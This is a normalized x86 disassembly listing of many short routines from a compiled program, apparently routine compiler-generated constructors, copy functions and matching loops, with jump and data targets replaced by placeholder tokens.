[ eax ] ecx
sub_421951
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
push edi
lea esi [ ebx + 0x50 ]
call sub_407804
mov esi [ ebp + 0x8 ]
mov ecx eax
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
add ebx 0x8
push ecx
call sub_423a2c
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_421995
push ebp
mov ebp esp
test ecx ecx
je r-xdata
xor eax eax
lea eax [ ecx + 0x8 ]
jmp r-xdata
cmp [ eax + 0x38 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_408952
pop ebp
retn 0x4
sub_4219fb
mov eax [ esi ]
test eax eax
jg r-xdata
mov eax esi
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
push 0x3e
push r--data
push r--data
call sub_4258e2
add esp 0xc
retn
push esi
call sub_423162
sub_421a27
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_421c57
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_421a47
push esi
push edi
push 0x8
pop ecx
mov esi edx
mov edi eax
[ edi ] [ esi ]
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov cl [ edx + 0x2c ]
pop edi
mov [ eax + 0x2c ] cl
pop esi
retn
sub_421a6d
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_421c87
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_421a8d
push esi
push edi
push 0x8
pop ecx
mov esi edx
mov edi eax
[ edi ] [ esi ]
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov cl [ edx + 0x2c ]
pop edi
mov [ eax + 0x2c ] cl
pop esi
retn
sub_421ab3
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_421cb7
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_421ad3
push esi
push edi
push 0x8
pop ecx
mov esi edx
mov edi eax
[ edi ] [ esi ]
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov cl [ edx + 0x2c ]
pop edi
mov [ eax + 0x2c ] cl
pop esi
retn
sub_421af9
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_421ce7
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_421b19
push esi
push edi
push 0x8
pop ecx
mov esi edx
mov edi eax
[ edi ] [ esi ]
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov cl [ edx + 0x2c ]
pop edi
mov [ eax + 0x2c ] cl
pop esi
retn
sub_421b3f
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_421d17
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_421b5f
push ebx
mov ebx eax
mov eax esi
call sub_416f3f
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
mov eax [ esi + 0x3c ]
mov [ ebx + 0x3c ] eax
mov eax [ esi + 0x40 ]
mov [ ebx + 0x40 ] eax
mov al [ esi + 0x44 ]
mov [ ebx + 0x44 ] al
mov eax ebx
pop ebx
retn
sub_421b85
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_421d56
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_421ba5
push ebx
mov ebx eax
mov eax esi
call sub_416f3f
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
mov eax [ esi + 0x3c ]
mov [ ebx + 0x3c ] eax
mov eax [ esi + 0x40 ]
mov [ ebx + 0x40 ] eax
mov al [ esi + 0x44 ]
mov [ ebx + 0x44 ] al
mov eax ebx
pop ebx
retn
sub_421bcb
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_421d95
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_421beb
push ebx
mov ebx eax
mov eax esi
call sub_416f3f
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
mov eax [ esi + 0x3c ]
mov [ ebx + 0x3c ] eax
mov eax [ esi + 0x40 ]
mov [ ebx + 0x40 ] eax
mov al [ esi + 0x44 ]
mov [ ebx + 0x44 ] al
mov eax ebx
pop ebx
retn
sub_421c11
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_421dd4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_421c31
push ebx
mov ebx eax
mov eax esi
call sub_416f3f
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
mov eax [ esi + 0x3c ]
mov [ ebx + 0x3c ] eax
mov eax [ esi + 0x40 ]
mov [ ebx + 0x40 ] eax
mov al [ esi + 0x44 ]
mov [ ebx + 0x44 ] al
mov eax ebx
pop ebx
retn
sub_421c57
push 0x0
mov eax sub_44a04b
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x38 ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_421c87
push 0x0
mov eax sub_44a028
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x38 ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_421cb7
push 0x0
mov eax sub_44a005
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x38 ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_421ce7
push 0x0
mov eax sub_449fe2
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x38 ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_421d17
push 0x0
mov eax sub_44cdd1
call sub_448595
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x50 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea esi [ edi + 0x2c ]
mov [ edi ] r--data
call sub_41472b
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_421d56
push 0x0
mov eax sub_44cda3
call sub_448595
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x50 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea esi [ edi + 0x2c ]
mov [ edi ] r--data
call sub_41472b
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_421d95
push 0x0
mov eax sub_44cd75
call sub_448595
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x50 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea esi [ edi + 0x2c ]
mov [ edi ] r--data
call sub_41472b
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_421dd4
push 0x0
mov eax sub_44cd47
call sub_448595
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x50 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea esi [ edi + 0x2c ]
mov [ edi ] r--data
call sub_41472b
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_421e20
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_421e50
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_421e80
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_421eb0
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_421ee0
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_421f10
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_421f40
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_421f70
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_421f9e
push ebp
mov ebp esp
test ecx ecx
jle r-xdata
jns r-xdata
mov edx [ ebp + 0x8 ]
sub edx [ eax ]
cmp edx ecx
add [ eax ] ecx
mov al 0x1
pop ebp
retn
mov edx [ eax ]
sub edx [ ebp + 0x8 ]
push esi
mov esi ecx
neg esi
cmp edx esi
pop esi
jmp r-xdata
xor al al
pop ebp
retn
jge r-xdata
sub_422139
push 0x4
mov eax sub_44a965
call sub_448595
mov edi [ ebp + 0x8 ]
lea eax [ edi + 0x4 ]
mov esi ebx
mov [ edi ] 0x1
mov [ ebp - 0x10 ] eax
call sub_4232c8
lea ecx [ eax + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_4231f4
mov [ edi + 0x8 ] 0x2
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi ebx
call sub_4232c8
add eax 0x38
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_4221ba
push 0x4
mov eax sub_44a93f
call sub_448595
mov edi [ ebp + 0x8 ]
lea eax [ edi + 0x4 ]
mov esi ebx
mov [ edi ] 0x1
mov [ ebp - 0x10 ] eax
call sub_4232e7
lea ecx [ eax + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_42320c
mov [ edi + 0x8 ] 0x2
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi ebx
call sub_4232e7
add eax 0x38
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_42223b
push 0x4
mov eax sub_44a919
call sub_448595
mov edi [ ebp + 0x8 ]
lea eax [ edi + 0x4 ]
mov esi ebx
mov [ edi ] 0x1
mov [ ebp - 0x10 ] eax
call sub_423306
lea ecx [ eax + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_423224
mov [ edi + 0x8 ] 0x2
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi ebx
call sub_423306
add eax 0x38
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_4222bc
push 0x4
mov eax sub_44a8f3
call sub_448595
mov edi [ ebp + 0x8 ]
lea eax [ edi + 0x4 ]
mov esi ebx
mov [ edi ] 0x1
mov [ ebp - 0x10 ] eax
call sub_423325
lea ecx [ eax + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_42323c
mov [ edi + 0x8 ] 0x2
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi ebx
call sub_423325
add eax 0x38
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_42233d
push 0x4
mov eax sub_44a8cd
call sub_448595
mov edi [ ebp + 0x8 ]
lea eax [ edi + 0x4 ]
mov esi ebx
mov [ edi ] 0x1
mov [ ebp - 0x10 ] eax
call sub_423344
lea ecx [ eax + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_423254
mov [ edi + 0x8 ] 0x2
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi ebx
call sub_423344
add eax 0x50
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_4223be
push 0x4
mov eax sub_44a8a7
call sub_448595
mov edi [ ebp + 0x8 ]
lea eax [ edi + 0x4 ]
mov esi ebx
mov [ edi ] 0x1
mov [ ebp - 0x10 ] eax
call sub_423363
lea ecx [ eax + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_42326c
mov [ edi + 0x8 ] 0x2
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi ebx
call sub_423363
add eax 0x50
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_42243f
push 0x4
mov eax sub_44a881
call sub_448595
mov edi [ ebp + 0x8 ]
lea eax [ edi + 0x4 ]
mov esi ebx
mov [ edi ] 0x1
mov [ ebp - 0x10 ] eax
call sub_423382
lea ecx [ eax + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_423284
mov [ edi + 0x8 ] 0x2
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi ebx
call sub_423382
add eax 0x50
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_4224c0
push 0x4
mov eax sub_44a85b
call sub_448595
mov edi [ ebp + 0x8 ]
lea eax [ edi + 0x4 ]
mov esi ebx
mov [ edi ] 0x1
mov [ ebp - 0x10 ] eax
call sub_4233a1
lea ecx [ eax + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_42329c
mov [ edi + 0x8 ] 0x2
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi ebx
call sub_4233a1
add eax 0x50
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_422541
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov ebx ecx
push edi
mov edi [ ebx + 0x28 ]
mov esi eax
mov eax [ esi ]
xor edx edx
neg edi
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x24 ] edx
jbe r-xdata
cmp [ ebx + 0x2c ] 0x0
je r-xdata
call sub_423b01
test al al
je r-xdata
cmp [ ebx + 0x20 ] edx
ja r-xdata
test edx edx
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
cmp eax [ ebx + 0x24 ]
jb r-xdata
mov [ esi ] eax
xor al al
jmp r-xdata
cmp eax [ esi + 0x10 ]
jne r-xdata
cmp edx [ ebx + 0x24 ]
jae r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push esi
call [ eax + 0x4 ]
test al al
je r-xdata
lea ecx [ eax + 0x1 ]
mov [ ebp - 0xc ] ecx
lea ecx [ ebp - 0xc ]
lea ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx esi
jmp r-xdata
mov eax [ ebx + 0x20 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov al 0x1
jmp r-xdata
mov ecx [ ecx ]
mov [ esi + 0x4c ] ecx
mov eax [ ebp - 0x8 ]
dec [ ebp - 0x4 ]
add [ esi ] edi
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_4225ee
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
cmp [ ebx + 0x2c ] 0x0
push edi
mov esi eax
je r-xdata
and [ ebp - 0x4 ] 0x0
cmp [ ebx + 0x20 ] 0x0
mov edi [ esi ]
jbe r-xdata
push 0x8e
push r--data
push r--data
call sub_4258e2
add esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push esi
call [ eax + 0x4 ]
test al al
jne r-xdata
call sub_423b01
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
xor al al
mov [ esi ] edi
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
cmp eax [ ebx + 0x20 ]
jb r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
call sub_423b01
test al al
jne r-xdata
sub_422666
push ebp
mov ebp esp
sub esp 0xc
push ebx
push edi
mov edi eax
mov ebx [ edi + 0x28 ]
mov eax [ esi ]
xor edx edx
neg ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
cmp [ edi + 0x24 ] edx
jbe r-xdata
cmp [ edi + 0x2c ] 0x0
je r-xdata
mov eax esi
call sub_423b55
test al al
je r-xdata
cmp [ edi + 0x20 ] edx
ja r-xdata
test edx edx
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
cmp eax [ edi + 0x24 ]
jb r-xdata
mov [ esi ] eax
xor al al
jmp r-xdata
cmp eax [ esi + 0x10 ]
jne r-xdata
cmp edx [ edi + 0x24 ]
jae r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push esi
call [ eax + 0x4 ]
test al al
je r-xdata
lea ecx [ eax + 0x1 ]
mov [ ebp - 0xc ] ecx
lea ecx [ ebp - 0xc ]
lea ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx esi
jmp r-xdata
mov eax [ edi + 0x20 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov al 0x1
jmp r-xdata
mov ecx [ ecx ]
mov [ esi + 0x4c ] ecx
mov eax [ ebp - 0x8 ]
dec [ ebp - 0x4 ]
add [ esi ] ebx
pop edi
pop ebx
leave
retn 0x8
sub_422711
push ebp
mov ebp esp
push ecx
push ebx
push edi
mov edi eax
cmp [ edi + 0x2c ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
cmp [ edi + 0x20 ] 0x0
mov ebx [ esi ]
jbe r-xdata
push 0x8e
push r--data
push r--data
call sub_4258e2
add esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push esi
call [ eax + 0x4 ]
test al al
jne r-xdata
mov eax esi
call sub_423b55
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
cmp eax [ edi + 0x24 ]
jae r-xdata
xor al al
mov [ esi ] ebx
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
cmp eax [ edi + 0x20 ]
jb r-xdata
pop edi
pop ebx
leave
retn 0x8
mov eax esi
call sub_423b55
test al al
jne r-xdata
sub_422789
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi eax
mov eax [ edi ]
xor ebx ebx
mov [ ebp - 0x4 ] eax
cmp [ esi + 0x8 ] ebx
jbe r-xdata
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx edi
call sub_423b9c
test al al
je r-xdata
cmp [ esi + 0x4 ] ebx
ja r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
inc ebx
cmp ebx [ esi + 0x8 ]
jb r-xdata
mov [ edi ] eax
xor al al
jmp r-xdata
cmp eax [ edi + 0x10 ]
jne r-xdata
cmp ebx [ esi + 0x8 ]
jae r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push edi
call [ eax + 0x4 ]
test al al
je r-xdata
lea ecx [ eax + 0x1 ]
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
jmp r-xdata
mov ecx edi
jmp r-xdata
cmp [ esi + 0x4 ] ebx
je r-xdata
mov al 0x1
jmp r-xdata
mov ecx [ ecx ]
mov [ edi + 0x4c ] ecx
mov eax [ ebp - 0x4 ]
dec ebx
dec [ edi ]
pop esi
pop ebx
leave
retn 0x8
sub_422812
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x4 ] 0x0
mov ebx [ edi ]
jbe r-xdata
push 0x8e
push r--data
push r--data
call sub_4258e2
add esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push edi
call [ eax + 0x4 ]
test al al
jne r-xdata
mov ecx edi
call sub_423b9c
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
cmp eax [ esi + 0x8 ]
jae r-xdata
xor al al
mov [ edi ] ebx
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x4 ]
jb r-xdata
pop esi
pop ebx
leave
retn 0x8
mov ecx edi
call sub_423b9c
test al al
jne r-xdata
sub_42288a
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push edi
mov edi eax
mov eax [ edi ]
xor ebx ebx
mov [ ebp - 0x4 ] eax
cmp [ esi + 0x8 ] ebx
jbe r-xdata
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_423bb6
test al al
je r-xdata
cmp [ esi + 0x4 ] ebx
ja r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
inc ebx
cmp ebx [ esi + 0x8 ]
jb r-xdata
mov [ edi ] eax
xor al al
jmp r-xdata
cmp eax [ edi + 0x10 ]
jne r-xdata
cmp ebx [ esi + 0x8 ]
jae r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push edi
call [ eax + 0x4 ]
test al al
je r-xdata
lea ecx [ eax + 0x1 ]
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
jmp r-xdata
mov ecx edi
jmp r-xdata
cmp [ esi + 0x4 ] ebx
je r-xdata
mov al 0x1
jmp r-xdata
mov ecx [ ecx ]
mov [ edi + 0x4c ] ecx
mov eax [ ebp - 0x4 ]
dec ebx
dec [ edi ]
pop edi
pop ebx
leave
retn 0x8
sub_422913
push ebp
mov ebp esp
push ecx
cmp [ esi + 0x10 ] 0x0
push ebx
push edi
mov edi eax
je r-xdata
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x4 ] 0x0
mov ebx [ edi ]
jbe r-xdata
push 0x8e
push r--data
push r--data
call sub_4258e2
add esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push edi
call [ eax + 0x4 ]
test al al
jne r-xdata
mov eax esi
call sub_423bb6
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
cmp eax [ esi + 0x8 ]
jae r-xdata
xor al al
mov [ edi ] ebx
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x4 ]
jb r-xdata
pop edi
pop ebx
leave
retn 0x8
mov eax esi
call sub_423bb6
test al al
jne r-xdata
sub_42298b
push ebp
mov ebp esp
sub esp 0xc
mov edx [ ecx + 0x4 ]
push ebx
mov ebx [ esi + 0x10 ]
push edi
mov edi [ esi ]
mov eax ebx
sub eax edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] eax
cmp edx eax
jbe r-xdata
add edx edi
mov [ ebp - 0xc ] edx
lea edi [ ebp - 0x8 ]
cmp eax [ ecx + 0x8 ]
jb r-xdata
cmp [ ecx + 0x10 ] 0x0
je r-xdata
mov edi [ edi ]
add edi [ esi ]
mov [ esi ] edi
cmp [ ecx + 0x10 ] 0x0
je r-xdata
lea edi [ ecx + 0x8 ]
xor al al
cmp edi ebx
jne r-xdata
mov edi [ ebp + 0x8 ]
jmp r-xdata
test eax eax
je r-xdata
inc edi
mov [ ebp + 0x8 ] edi
lea eax [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ edi ]
push esi
mov ecx edi
call [ eax + 0x4 ]
test al al
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax ebx
cmp ecx eax
jne r-xdata
cmp eax [ ecx + 0x8 ]
jae r-xdata
mov eax [ eax ]
mov [ esi + 0x4c ] eax
jmp r-xdata
mov eax [ esi ]
cmp [ ebp - 0xc ] eax
je r-xdata
mov al 0x1
jmp r-xdata
inc ecx
mov [ ebp - 0x8 ] ecx
lea eax [ ebp - 0x8 ]
